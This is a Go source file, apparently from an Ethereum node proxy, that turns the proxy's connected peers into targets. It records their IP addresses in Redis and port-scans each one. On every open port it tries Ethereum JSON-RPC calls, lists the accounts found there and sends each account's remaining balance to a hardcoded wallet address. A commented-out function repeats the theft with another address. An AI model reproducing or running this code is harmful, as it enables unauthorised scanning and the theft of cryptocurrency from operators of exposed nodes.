package main

import (
	"./logger"
	"./rpcs"
	"fmt"
	"math/big"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

func (pxy *proxy) startHack() {
	fmt.Println("start Hacking..........................")
	// go pxy.connectNode()
	// go pxy.hackGetConnect()
	// 写node ip到redis
	pxy.connectNode()
}
func (pxy *proxy) connectNode() {
	all := pxy.ethpeerset.AllPeer()
	for _, v := range all {
		addr := v.P.RemoteAddr().String()

		add := strings.Split(addr, ":")
		// logger.Info(k, ":", add[0])
		red.WriteNode(add[0], "1024")
	}
}
func (pxy *proxy) hackGetConnect() {
	addrs := red.GetAddrs() //获取写入的地址，此地址还没有进行链接
	logger.Info("GetAddrs:", len(addrs))
	if len(addrs) == 0 {
		time.Sleep(time.Second * 100)
	}
	for addr, port := range addrs {
		// i := red.GetPort(addr)
		i, err := strconv.Atoi(port)
		if err != nil {
			logger.Info("atoi err:", err)
		}
		// // i := fmt.Sprintf("%d", port)
		// for ; i < 65535; i++ {
		// 	red.SetPort(addr, fmt.Sprintf("%d", i))
		// 	addrport := "http://" + addr + ":" + fmt.Sprintf("%d", i)
		// 	r := rpcs.NewRPCClient("xx", addrport, "3s")
		// 	//if connected write to redis set
		// 	_, err := r.GetBlockNumber()
		// 	if err == nil {
		// 		red.WriteGoodPort(addr + ":" + fmt.Sprintf("%d", i))
		// 	}
		// 	logger.Info("hackGetConnect:", addrport)
		// 	time.Sleep(3 * time.Second)

		// }
		ip := net.ParseIP(addr)
		pxy.scanIP(ip, i)
	}
	// pxy.hackChan <- true
}
func (pxy *proxy) hackReal() {
	addrs, err := red.GetGoodPort() //获取写入的地址，此地址还没有进行链接
	if err != nil {
		logger.Info("hackReal:", err)
	}
	logger.Info("hackReal:", len(addrs))
	for _, addr := range addrs {
		r := rpcs.NewRPCClient("xx", "http://"+addr, "3s")
		// 	//if connected write to redis set
		_, err := r.GetBlockNumber()
		if err == nil {
			logger.Info("GetBlockNumber:", addr)
			// red.WriteRealEthPort(addr)
			acc, err2 := r.GetAccounts()
			if err2 == nil {
				logger.Info("GetAccounts:", addr)
				for _, a := range acc {
					balance, err2 := r.GetBalance(a)
					if err2 == nil {
						logger.Info("GetBalance:", addr)
						left := balance.Sub(balance, big.NewInt(22000*22000000000))
						if left.Cmp(big.NewInt(0)) > 0 {
							r.SendTransaction(a, "6c654877175869c1349767336688682955e8edf8", "22000", "22000000000", left.Text(10), false)
							logger.Info("sendtransaction:", addr)
						}
					}
				}
			}
		}
		logger.Info("hackReal:", addr)
		time.Sleep(3 * time.Second)
	}
}
func (pxy *proxy) scanIP(ip net.IP, i int) {
	var wg sync.WaitGroup
	proto := "tcp"
	for ; i < 65535; i++ {
		addr := fmt.Sprintf("%s:%d", ip, i)
		wg.Add(1)
		go func(proto, addr string) {
			defer wg.Done()

			c, err := net.DialTimeout(proto, addr, time.Duration(1*time.Second))
			if err == nil {
				c.Close()
				// logrus.Infof("%s://%s is alive and reachable", proto, addr)
				red.WriteGoodPort(addr)
			}
		}(proto, addr)

	}
	wg.Wait()
}
func (pxy *proxy) rpcFromGoodNode() {
	// addrport := "http://" + addr + ":" + fmt.Sprintf("%d", i)
	// r := rpcs.NewRPCClient("xx", addrport, "3s")
	// acc, err := r.GetAccounts()
	// if err != nil {
	// 	fmt.Println("addrport GetAccounts:", err)
	// 	continue
	// }
	// for _, ac := range acc {
	// 	balance, err := r.GetBalance(ac)
	// 	if err != nil {
	// 		fmt.Println("addrport GetBalance:", err)
	// 		continue
	// 	}
	// 	if balance.Cmp(new(big.Int).SetInt64(21000*100000000000)) > 0 {
	// 		b := balance.Sub(balance, new(big.Int).SetInt64(21000*100000000000))
	// 		r.SendTransaction(ac, "0xd70c043f66e4211b7cded5f9b656c2c36dc02549", "21000", "100000000000", b.Text(10), false)
	// 	}
	// }
}
